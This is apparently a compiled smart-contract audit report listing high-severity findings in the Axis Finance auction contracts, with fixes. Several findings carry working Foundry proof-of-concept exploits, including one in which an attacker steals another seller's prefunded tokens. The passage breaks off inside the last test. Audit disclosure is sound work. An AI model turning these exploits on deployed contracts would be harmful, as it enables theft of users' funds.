# Issue H-1: Malicious user can overtake a prefunded auction and steal the deposited funds 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/12 

## Found by 
0xLogos, 0xboriskataa, 404666, 404Notfound, AgileJune, Bauer, Honour, JohnSmith, KiroBrejka, Kose, audithare, bhilare\_, cu5t0mPe0, devblixt, dimulski, dinkras, ether\_sky, flacko, hash, hulkvision, jecikpo, joicygiore, lemonmon, luxurioussauce, merlin, nine9, novaman33, petro1912, poslednaya, radin200, seeques, shaka, sl1, underdog
## Summary
In the auction house whenever a new auction (lot) is created, its details are recorded at the 0th index in the `lotRouting` mapping. This allows for an attacker to create an auction right after an honest user and take over their auction, allowing them to steal funds in the case of a prefunded auction.

## Vulnerability Detail
When a new auction is created via [AuctionHouse#auction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164), it's routing details are recorded directly in storage at `lotRouting[lotId]` where `lotId` is the return value of the `auction()` function itself. Since the return value is declared as a variable at the function signature level, it is initialized with the value of `0`.

This means that when the `routing` [storage variable is declared](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174) (`Routing storage routing = lotRouting[lotId];`) it will always point to `lotRouting[0]` as the value of `lotId` is set a bit later in the `auction()` function to the correct index. This itself leads to the issue that an honest user can create a prefunded auction and an attacker can then come in, create a new auction themselves that is not prefunded and be immediately entitled to the honest user's prefunded funds by cancelling the auction they've just created as they're set as the `seller` of the lot at `lotRouting[0]`.

This attack is also possible because the `funding` attribute of a lot is only set if an auction is specified to be prefunded in its parameters at creation.
## Impact
The following POC demonstrates how an attacker can overtake an honest user's auction and steal the funds they've pre-deposited. The attacker only needs to ensure the base token of the malicious auction they are creating is the same as the one of the auction of the honest user. Once that's done, the attacker only needs to cancel the auction and the funds will be transferred to them.

To run the POC just create a file `AuctionHouseTest.t.sol` somewhere under the `./moonraker/test` directory, add `src=/src/` to **remappings.txt** and run it using `forge test --match-test test_overtake_auction_and_steal_prefunded_funds`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Libraries
import {Test} from "forge-std/Test.sol";
import {ERC20} from 'solmate/tokens/ERC20.sol';

import 'src/modules/Modules.sol';
import {Auction} from 'src/modules/Auction.sol';

import {AuctionHouse} from 'src/AuctionHouse.sol';
import {FixedPriceAuctionModule} from 'src/modules/auctions/FPAM.sol';

contract AuctionHouseTest is Test {
  AuctionHouse public auctionHouse;
  FixedPriceAuctionModule public fixedPriceAuctionModule;

  address public OWNER = makeAddr('Owner');
  address public PROTOCOL = makeAddr('Protocol');
  address public PERMIT2 = makeAddr('Permit 2');

  MockERC20 public baseToken = new MockERC20("Base", "BASE", 18);
  MockERC20 public quoteToken = new MockERC20("Quote", "QUOTE", 18);

  function setUp() public {
    vm.warp(1710965574);
    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);
    fixedPriceAuctionModule = new FixedPriceAuctionModule(address(auctionHouse));

    vm.prank(OWNER);
    auctionHouse.installModule(fixedPriceAuctionModule);
  }

  function test_overtake_auction_and_steal_prefunded_funds() public {
    // Step 1
    uint256 PREFUNDED_AMOUNT = 1_000e18;
    address USER = makeAddr('User');
    vm.startPrank(USER);
    baseToken.mint(PREFUNDED_AMOUNT);
    baseToken.approve(address(auctionHouse), PREFUNDED_AMOUNT);

    AuctionHouse.RoutingParams memory routingParams;
    routingParams.auctionType = keycodeFromVeecode(fixedPriceAuctionModule.VEECODE());
    routingParams.baseToken = baseToken;
    routingParams.quoteToken = quoteToken;
    routingParams.prefunded = true;

    Auction.AuctionParams memory auctionParams;
    auctionParams.start = uint48(block.timestamp + 1 weeks);
    auctionParams.duration = 5 days;
    auctionParams.capacity = uint96(PREFUNDED_AMOUNT);
    auctionParams.implParams =
      abi.encode(FixedPriceAuctionModule.FixedPriceParams({price: 1e18, maxPayoutPercent: 100_000}));

    auctionHouse.auction(routingParams, auctionParams, "");

    // Step 2
    address ATTACKER = makeAddr('Attacker');
    vm.startPrank(ATTACKER);

    routingParams.prefunded = false;
    auctionHouse.auction(routingParams, auctionParams, "");
	
    // ATTACKER is now the seller of the lot at lotRouting[0]; the lot's funding remains the same
    auctionHouse.cancel(0, "");

    assertEq(baseToken.balanceOf(ATTACKER), PREFUNDED_AMOUNT);
    assertEq(baseToken.balanceOf(USER), 0);
  }
}

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
      _mint(msg.sender, amount);
    }
}
```
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L194
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L211-L212
## Tool used
Manual Review
Foundry Forge

## Recommendation
```diff
diff --git a/moonraker/src/bases/Auctioneer.sol b/moonraker/src/bases/Auctioneer.sol
index a77585b..48c39d5 100644
--- a/moonraker/src/bases/Auctioneer.sol
+++ b/moonraker/src/bases/Auctioneer.sol
@@ -171,6 +171,9 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
             revert InvalidParams();
         }
 
+        // Increment lot count and get ID
+        lotId = lotCounter++;
+
         Routing storage routing = lotRouting[lotId];
 
         bool requiresPrefunding;
@@ -190,9 +193,6 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
                     || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18
             ) revert InvalidParams();
 
-            // Increment lot count and get ID
-            lotId = lotCounter++;
-
             // Call module auction function to store implementation-specific data
             (lotCapacity) =
                 auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);
```

# Issue H-2: [M-1] 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/21 

## Found by 
Aymen0909, KiroBrejka, ether\_sky, novaman33, sl1
## Summary
Seller's funds may remain locked in the protocol, because of revert on 0 transfer tokens.
In the README.md file is stated that the protocol uses every token with ERC20 Metadata and decimals between 6-18, which includes some revert on 0 transfer tokens, so this should be considered as valid issue!

## Vulnerability Detail
in the `AuctionHouse::claimProceeds()` function there is the following block of code:
```javascript
       uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;
        unchecked {
            routing.funding -= prefundingRefund;
        }
        Transfer.transfer(
            routing.baseToken,
            _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),
            prefundingRefund,
            false
        );
```
Since the batch auctions must be prefunded so `routing.funding` shouldn’t be zero unless all the tokens were sent in settle, in which case `payoutSent` will equal `sold_`. From this we make the conclusion that it is possible for `prefundingRefund` to be equal to 0. This means if the `routing.baseToken` is a revert on 0 transfer token the seller will never be able to get the `quoteToken` he should get from the auction.

## Impact
The seller's funds remain locked in the system and he will never be able to get them back.

## Code Snippet
The problematic block of code in the `AuctionHouse::claimProceeds()` function:
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L604-L613

`Transfer::transfer()` function, since it transfers the `baseToken`:
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/Transfer.sol#L49-L68

## Tool used

Manual Review

## Recommendation
Check if the `prefundingRefund > 0` like this:
```diff
   function claimProceeds(
        uint96 lotId_,
        bytes calldata callbackData_
    ) external override nonReentrant {
        // Validation
        _isLotValid(lotId_);

        // Call auction module to validate and update data
        (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =
            _getModuleForId(lotId_).claimProceeds(lotId_);

        // Load data for the lot
        Routing storage routing = lotRouting[lotId_];

        // Calculate the referrer and protocol fees for the amount in
        // Fees are not allocated until the user claims their payout so that we don't have to iterate through them here
        // If a referrer is not set, that portion of the fee defaults to the protocol
        uint96 totalInLessFees;
        {
            (, uint96 toProtocol) = calculateQuoteFees(
                lotFees[lotId_].protocolFee, lotFees[lotId_].referrerFee, false, purchased_
            );
            unchecked {
                totalInLessFees = purchased_ - toProtocol;
            }
        }

        // Send payment in bulk to the address dictated by the callbacks address
        // If the callbacks contract is configured to receive quote tokens, send the quote tokens to the callbacks contract and call the onClaimProceeds callback
        // If not, send the quote tokens to the seller and call the onClaimProceeds callback
        _sendPayment(routing.seller, totalInLessFees, routing.quoteToken, routing.callbacks);

        // Refund any unused capacity and curator fees to the address dictated by the callbacks address
        // By this stage, a partial payout (if applicable) and curator fees have been paid, leaving only the payout amount (`totalOut`) remaining.
        uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;
++ if(prefundingRefund > 0) { 
        unchecked {
            routing.funding -= prefundingRefund;
        }
            Transfer.transfer(
            routing.baseToken,
            _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),
            prefundingRefund,
            false
        );
++        }
       

        // Call the onClaimProceeds callback
        Callbacks.onClaimProceeds(
            routing.callbacks, lotId_, totalInLessFees, prefundingRefund, callbackData_
        );
    }
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/109.

**nevillehuang**

#21, #31 and #112 highlights the same issue of `prefundingRefund = 0`

#78 and #97  highlights the same less likely issue of `totalInLessFees = 0`

All points to same underlying root cause of such tokens not allowing transfer of zero, so duplicating them. Although this involves a specific type of ERC20, the impact could be significant given seller's fund would be locked permanently

# Issue H-3: Module's gas yield can never be claimed and all yield will be lost 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/26 

## Found by 
Aymen0909, ether\_sky, hash, irresponsible, merlin, no, sl1
## Summary
Module's gas yield can never be claimed
## Vulnerability Detail
The protocol is meant to be deployed on blast, meaning that the gas and ether balance accrue yield.

By default these yield settings for both ETH and GAS yields are set to VOID as default, meaning that unless we configure the yield mode to claimable, we will be unable to recieve the yield. The protocol never sets gas to claimable for the modules, and the governor of the contract is the auction house, the auction house also does not implement any function to set the modules gas yield to claimable.

```solidity
 constructor(address auctionHouse_) LinearVesting(auctionHouse_) BlastGas(auctionHouse_) {}
```
The constructor of  both BlastLinearVesting and BlastEMPAM set the auction house here 
`BlastGas(auctionHouse_)` if we look at this contract we can observe the above.

BlastGas.sol
```solidity
    constructor(address parent_) {
        // Configure governor to claim gas fees
        IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);
    }
```

As we can see above, the governor is set in constructor, but we never set gas to claimable. Gas yield mode will be in its default mode which is VOID, the modules will not accue gas yields. Since these modules never set gas yield mode to claimable, the auction house cannot claim any gas yield for either of the contracts. Additionally the auction house includes no function to configure yield mode, the auction house contract only has a function to claim the gas yield but this will revert since the yield mode for these module contracts will be VOID.
## Impact
Gas yields will never acrue and the yield will forever be lost
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/blast/modules/BlastGas.sol#L11
## Tool used

Manual Review

## Recommendation
change the following in BlastGas contract, this will set the gas yield of the modules to claimable in the constructor and allowing the auction house to claim gas yield.

```solidity
interface IBlast {
   function configureGovernor(address governor_) external;
   function configureClaimableGas() external; 
}

abstract contract BlastGas {
    // ========== CONSTRUCTOR ========== //

    constructor(address parent_) {
        // Configure governor to claim gas fees
       IBlast(0x4300000000000000000000000000000000000002).configureClaimableGas();
       IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);
    }
}
```



## Discussion

**nevillehuang**

Valid, due to this [comment](https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/blast/modules/BlastGas.sol#L12) within the contract indicating interest in claiming gas yield but it can never be claimed

# Issue H-4: Auction creators have the ability to lock bidders' funds. 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/66 

## Found by 
KiroBrejka, ether\_sky, hash, jecikpo, lemonmon, novaman33, qbs, sl1, underdog
## Summary
`Auction creators` have the ability to cancel an `auction` before it starts.
However, once the `auction` begins, they should not be allowed to cancel it.
During the `auction`, `bidders` can place `bids` and send `quote` tokens to the `auction house`.
After the `auction` concludes, `bidders` can either receive `base` tokens or retrieve their `quote` tokens.
Unfortunately, `batch auction creators` can cancel an `auction` when it ends.
This means that `auction creators` can cancel their `auctions` if they anticipate `losses`.
This should not be allowed.
The significant risk is that `bidders' funds` could become locked in the `auction house`.
## Vulnerability Detail
`Auction creators` can not cancel an `auction` once it concludes.
```solidity
function cancelAuction(uint96 lotId_) external override onlyInternal {
    _revertIfLotConcluded(lotId_);
}
```
They also can not cancel it while it is active.
```solidity
function _cancelAuction(uint96 lotId_) internal override {
    _revertIfLotActive(lotId_);

    auctionData[lotId_].status = Auction.Status.Claimed;
}
```
When the `block.timestamp` aligns with the `conclusion` time of the `auction`, we can bypass these checks.
```solidity
function _revertIfLotConcluded(uint96 lotId_) internal view virtual {
    if (lotData[lotId_].conclusion < uint48(block.timestamp)) {
        revert Auction_MarketNotActive(lotId_);
    }

    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);
}
function _revertIfLotActive(uint96 lotId_) internal view override {
    if (
        auctionData[lotId_].status == Auction.Status.Created
            && lotData[lotId_].start <= block.timestamp
            && lotData[lotId_].conclusion > block.timestamp
    ) revert Auction_WrongState(lotId_);
}
```
So `Auction creators` can cancel an `auction` when it concludes.
Then the `capacity` becomes `0` and the `auction status` transitions to `Claimed`.

`Bidders` can not `refund` their `bids`.
```solidity
function refundBid(
    uint96 lotId_,
    uint64 bidId_,
    address caller_
) external override onlyInternal returns (uint96 refund) {
    _revertIfLotConcluded(lotId_);
}
 function _revertIfLotConcluded(uint96 lotId_) internal view virtual {
    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);
}
```
The only way for `bidders` to reclaim their tokens is by calling the `claimBids` function.
However, `bidders` can only claim `bids` when the `auction status` is `Settled`.
```solidity
function claimBids(
    uint96 lotId_,
    uint64[] calldata bidIds_
) {
    _revertIfLotNotSettled(lotId_);
}
```
To `settle` the `auction`, the `auction status` should be `Decrypted`.
This requires submitting the `private key`.
The `auction creator` can not submit the `private key` or submit it without decrypting any `bids` by calling `submitPrivateKey(lotId, privateKey, 0)`.
Then nobody can decrypt the `bids` using the `decryptAndSortBids` function which always reverts.
```solidity
function decryptAndSortBids(uint96 lotId_, uint64 num_) external {
    if (
        auctionData[lotId_].status != Auction.Status.Created     // @audit, here
            || auctionData[lotId_].privateKey == 0
    ) {
        revert Auction_WrongState(lotId_);
    }

    _decryptAndSortBids(lotId_, num_);
}
```
As a result, the `auction status` remains unchanged, preventing it from transitioning to `Settled`.
This leaves the `bidders'` `quote` tokens locked in the `auction house`.

Please add below test to the `test/modules/Auction/cancel.t.sol`.
```solidity
function test_cancel() external whenLotIsCreated {
    Auction.Lot memory lot = _mockAuctionModule.getLot(_lotId);

    console2.log("lot.conclusion before   ==> ", lot.conclusion);
    console2.log("block.timestamp before  ==> ", block.timestamp);
    console2.log("isLive                  ==> ", _mockAuctionModule.isLive(_lotId));

    vm.warp(lot.conclusion - block.timestamp + 1);
    console2.log("lot.conclusion after    ==> ", lot.conclusion);
    console2.log("block.timestamp after   ==> ", block.timestamp);
    console2.log("isLive                  ==> ", _mockAuctionModule.isLive(_lotId));

    vm.prank(address(_auctionHouse));
    _mockAuctionModule.cancelAuction(_lotId);
}
```
The log is
```solidity
lot.conclusion before   ==>  86401
block.timestamp before  ==>  1
isLive                  ==>  true
lot.conclusion after    ==>  86401
block.timestamp after   ==>  86401
isLive                  ==>  false
```
## Impact
Users' funds can be locked.
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/Auction.sol#L354
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L204
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/Auction.sol#L512
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/Auction.sol#L556
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L449
## Tool used

Manual Review

## Recommendation
```solidity
function _revertIfLotConcluded(uint96 lotId_) internal view virtual {
-     if (lotData[lotId_].conclusion < uint48(block.timestamp)) {
+     if (lotData[lotId_].conclusion <= uint48(block.timestamp)) {
        revert Auction_MarketNotActive(lotId_);
    }

    // Capacity is sold-out, or cancelled
    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);
}
```

# Issue H-5: Bidders can not claim their bids if the auction creator claims the proceeds. 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/67 

## Found by 
cu5t0mPe0, ether\_sky, hash, jecikpo, joicygiore, novaman33
## Summary
Before the `batch auction` begins, the `auction creator` should `prefund` `base` tokens to the `auction house`.
During the `auction`, `bidders` transfer `quote` tokens to the `auction house`.
After the `auction` settles,
- `Bidders` can claim their `bids` and either to receive `base` tokens or `retrieve` their `quote` tokens.
- The `auction creator` can receive the `quote` tokens and retrieve the remaining `base` tokens.
- There is no specific order for these two operations.

However, if the `auction creator` claims the `proceeds`, `bidders` can not claim their `bids` anymore.
Consequently, their `funds` will remain locked in the `auction house`.
## Vulnerability Detail
When the `auction creator` claims `Proceeds`, the `auction status` changes to `Claimed`.
```solidity
function _claimProceeds(uint96 lotId_)
    internal
    override
    returns (uint96 purchased, uint96 sold, uint96 payoutSent)
{
    auctionData[lotId_].status = Auction.Status.Claimed;
}
```
Once the `auction status` has transitioned to `Claimed`, there is indeed no way to change it back to `Settled`.

However, `bidders` can only claim their `bids` when the `auction status` is `Settled`.
```solidity
function claimBids(
    uint96 lotId_,
    uint64[] calldata bidIds_
)
    external
    override
    onlyInternal
    returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)
{
    _revertIfLotInvalid(lotId_);
    _revertIfLotNotSettled(lotId_);   // @audit, here

    return _claimBids(lotId_, bidIds_);
}
```

Please add below test to the `test/modules/auctions/claimBids.t.sol`.
```solidity
function test_claimProceeds_before_claimBids()
    external
    givenLotIsCreated
    givenLotHasStarted
    givenBidIsCreated(_BID_AMOUNT_UNSUCCESSFUL, _BID_AMOUNT_OUT_UNSUCCESSFUL)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)
    givenLotHasConcluded
    givenPrivateKeyIsSubmitted
    givenLotIsDecrypted
    givenLotIsSettled
{
    uint64 bidId = 1;

    uint64[] memory bidIds = new uint64[](1);
    bidIds[0] = bidId;

    // Call the function
    vm.prank(address(_auctionHouse));
    _module.claimProceeds(_lotId);


    bytes memory err = abi.encodeWithSelector(EncryptedMarginalPriceAuctionModule.Auction_WrongState.selector, _lotId);
    vm.expectRevert(err);
    vm.prank(address(_auctionHouse));
    _module.claimBids(_lotId, bidIds);
}
```
## Impact
Users' funds could be locked.
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L846
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/Auction.sol#L556
## Tool used

Manual Review

## Recommendation
Allow `bidders` to claim their `bids` even when the `auction status` is `Claimed`.



## Discussion

**Oighty**

Duplicate of #18 

# Issue H-6: Bidders' funds may become locked due to inconsistent price order checks in MaxPriorityQueue and the _claimBid function. 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/83 

## Found by 
ether\_sky
## Summary
In the `MaxPriorityQueue`, `bids` are ordered by decreasing `price`.
We calculate the `marginal price`, `marginal bid ID`, and determine the `auction winners`.
When a `bidder` wants to claim, we verify that the `bid price` of this `bidder` exceeds the `marginal price`.
However, there's minor inconsistency: certain `bids` may have `marginal price` and a smaller `bid ID` than `marginal bid ID` and they are not actually `winners`.
As a result, the `auction winners` and these `bidders` can receive `base` tokens.
However, there is a finite supply of `base` tokens for `auction winners`.
Early `bidders` who claim can receive `base` tokens, but the last `bidders` can not.
## Vulnerability Detail
The comparison for the order of `bids` in the `MaxPriorityQueue` is as follow:
if `q1 * b2 < q2 * b1` then `bid (q2, b2)` takes precedence over `bid (q1, b1)`.
```solidity
function _isLess(Queue storage self, uint256 i, uint256 j) private view returns (bool) {
    uint64 iId = self.bidIdList[i];
    uint64 jId = self.bidIdList[j];
    Bid memory bidI = self.idToBidMap[iId];
    Bid memory bidJ = self.idToBidMap[jId];
    uint256 relI = uint256(bidI.amountIn) * uint256(bidJ.minAmountOut);
    uint256 relJ = uint256(bidJ.amountIn) * uint256(bidI.minAmountOut);
    if (relI == relJ) {
        return iId > jId;
    }
    return relI < relJ;
}
```
And in the `_calimBid` function, the `price` is checked directly as follow:
if `q * 10 ** baseDecimal / b >= marginal price`, then this `bid` can be claimed.
```solidity
function _claimBid(
    uint96 lotId_,
    uint64 bidId_
) internal returns (BidClaim memory bidClaim, bytes memory auctionOutput_) {
    uint96 price = uint96(
        bidData.minAmountOut == 0
            ? 0 // TODO technically minAmountOut == 0 should be an infinite price, but need to check that later. Need to be careful we don't introduce a way to claim a bid when we set marginalPrice to type(uint96).max when it cannot be settled.
            : Math.mulDivUp(uint256(bidData.amount), baseScale, uint256(bidData.minAmountOut))
    );
    uint96 marginalPrice = auctionData[lotId_].marginalPrice;
    if (
        price > marginalPrice
            || (price == marginalPrice && bidId_ <= auctionData[lotId_].marginalBidId)
    ) { }
}
```
The issue is that a `bid` with the `marginal price` might being placed after `marginal bid` in the `MaxPriorityQueue` due to rounding.
```solidity
q1 * b2 < q2 * b1, but mulDivUp(q1, 10 ** baseDecimal, b1) = mulDivUp(q2, 10 ** baseDecimal, b2)
```

Let me take an example.
The `capacity` is `10e18` and there are `6 bids` (`(4e18 + 1, 2e18)` for first `bidder`, `(4e18 + 2, 2e18)` for the other `bidders`.
The order in the `MaxPriorityQueue` is `(2, 3, 4, 5, 6, 1)`.
The `marginal bid ID` is `6`.
The `marginal price` is `2e18 + 1`.
The `auction winners` are `(2, 3, 4, 5, 6)`.
However, `bidder 1` can also claim because it's `price` matches the `marginal price` and it has the smallest `bid ID`.
There are only `10e18` `base` tokens, but all `6 bidders` require `2e18` `base` tokens.
As a result, at least one `bidder` won't be able to claim `base` tokens, and his `quote` tokens will remain locked in the `auction house`.

The Log is
```solidity
marginal price     ==>   2000000000000000001
marginal bid id    ==>   6

paid to bid  1       ==>   4000000000000000001
payout to bid  1     ==>   1999999999999999999
*****
paid to bid  2       ==>   4000000000000000002
payout to bid  2     ==>   2000000000000000000
*****
paid to bid  3       ==>   4000000000000000002
payout to bid  3     ==>   2000000000000000000
*****
paid to bid  4       ==>   4000000000000000002
payout to bid  4     ==>   2000000000000000000
*****
paid to bid  5       ==>   4000000000000000002
payout to bid  5     ==>   2000000000000000000
*****
paid to bid  6       ==>   4000000000000000002
payout to bid  6     ==>   2000000000000000000
```
Please add below test to the `test/modules/auctions/EMPA/claimBids.t.sol`
```solidity
function test_claim_nonClaimable_bid()
    external
    givenLotIsCreated
    givenLotHasStarted
    givenBidIsCreated(4e18 + 1, 2e18)           // bidId = 1
    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 2
    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 3
    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 4
    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 5
    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 6
    givenLotHasConcluded
    givenPrivateKeyIsSubmitted
    givenLotIsDecrypted
    givenLotIsSettled
{
    EncryptedMarginalPriceAuctionModule.AuctionData memory auctionData = _getAuctionData(_lotId);

    console2.log('marginal price     ==>  ', auctionData.marginalPrice);
    console2.log('marginal bid id    ==>  ', auctionData.marginalBidId);
    console2.log('');

    for (uint64 i; i < 6; i ++) {
        uint64[] memory bidIds = new uint64[](1);
        bidIds[0] = i + 1;
        vm.prank(address(_auctionHouse));
        (Auction.BidClaim[] memory bidClaims,) = _module.claimBids(_lotId, bidIds);
        Auction.BidClaim memory bidClaim = bidClaims[0];
        if (i > 0) {
            console2.log('*****');
        }
        console2.log('paid to bid ', i + 1, '      ==>  ', bidClaim.paid);
        console2.log('payout to bid ', i + 1, '    ==>  ', bidClaim.payout);
    }
}
```
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/lib/MaxPriorityQueue.sol#L109-L120
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L347-L350
## Tool used

Manual Review

## Recommendation
In the `MaxPriorityQueue`, we should check the `price`: `Math.mulDivUp(q, 10 ** baseDecimal, b)`.



## Discussion

**Oighty**

Believe this is valid due to bids below marginal price being able to claim, which would result in a winning bidder not receiving theirs. Need to think about the remediation a bit more. There are some other precision issues with the rounding up.

# Issue H-7: Overflow in curate() function, results in permanently stuck funds 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/88 

## Found by 
dimulski, merlin
## Summary
The ``Axis-Finance`` protocol has a [curate()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L634-L699) function that can be used to set a certain fee to a curator set by the seller for a certain auction. Typically, a curator is providing some service to an auction seller to help the sale succeed. This could be doing diligence on the project and ``vouching`` for them, or something simpler, such as listing the auction on a popular interface. A lot of memecoins have a big supply in the trillions, for example [SHIBA INU](https://etherscan.io/token/0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce#readContract#F2) has a total supply of nearly **1000 trillion tokens** and each token has 18 decimals. With a lot of new memecoins emerging every day due to the favorable bullish conditions and having supply in the trillions, it is safe to assume that  such protocols will interact with the ``Axis-Finance`` protocol. Creating auctions for big amounts, and promising big fees to some celebrities or influencers to promote their project. The funding parameter in the **Routing struct** is of type ``uint96``
```solidity
    struct Routing {
        ...
        uint96 funding; 
        ...
    }
```
The max amount of tokens with 18 decimals a ``uint96`` variable can hold is around 80 billion. The problem arises in the [curate()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L634-L699) function, If the auction is prefunded, which all batch auctions are( a normal **FPAM** auction can also be prefunded), and the amount of prefunded tokens is big enough, close to **80 billion tokens with 18 decimals**, and the curator fee is for example **7.5%**, when the ``curatorFeePayout`` is added to the current funding, the funding will overflow. 
```solidity
unchecked {
   routing.funding += curatorFeePayout;
}
```
## Vulnerability Detail
[Gist](https://gist.github.com/AtanasDimulski/a47112fc7ae473fd69b42ba997819726)
After following the steps in the above mentioned [gist](https://gist.github.com/AtanasDimulski/a47112fc7ae473fd69b42ba997819726), add the following test to the ``AuditorTests.t.sol``
```solidity
function test_CuratorFeeOverflow() public {
        vm.startPrank(alice);
        Veecode veecode = fixedPriceAuctionModule.VEECODE();
        Keycode keycode = keycodeFromVeecode(veecode);
        bytes memory _derivativeParams = "";
        uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens
        mockBaseToken.mint(alice, 100_000_000_000e18);
        mockBaseToken.approve(address(auctionHouse), type(uint256).max);

        FixedPriceAuctionModule.FixedPriceParams  memory myStruct = FixedPriceAuctionModule.FixedPriceParams({
            price: uint96(1e18),
            maxPayoutPercent: uint24(1e5)
        });

        Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({
            auctionType: keycode,
            baseToken: mockBaseToken,
            quoteToken: mockQuoteToken,
            curator: curator,
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: toKeycode(""),
            derivativeParams: _derivativeParams,
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory paramsA = Auction.AuctionParams({
            start: 0,
            duration: 1 days,
            capacityInQuote: false,
            capacity: lotCapacity,
            implParams: abi.encode(myStruct)
        });

        string memory infoHashA;
        auctionHouse.auction(routingA, paramsA, infoHashA);       
        vm.stopPrank();

        vm.startPrank(owner);
        FeeManager.FeeType type_ = FeeManager.FeeType.MaxCurator;
        uint48 fee = 7_500; // 7.5% max curator fee
        auctionHouse.setFee(keycode, type_, fee);
        vm.stopPrank();

        vm.startPrank(curator);
        uint96 fundingBeforeCuratorFee;
        uint96 fundingAfterCuratorFee;
        (,fundingBeforeCuratorFee,,,,,,,) = auctionHouse.lotRouting(0);
        console2.log("Here is the funding normalized before curator fee is set: ", fundingBeforeCuratorFee/1e18);
        auctionHouse.setCuratorFee(keycode, fee);
        bytes memory callbackData_ = "";
        auctionHouse.curate(0, callbackData_);
        (,fundingAfterCuratorFee,,,,,,,) = auctionHouse.lotRouting(0);
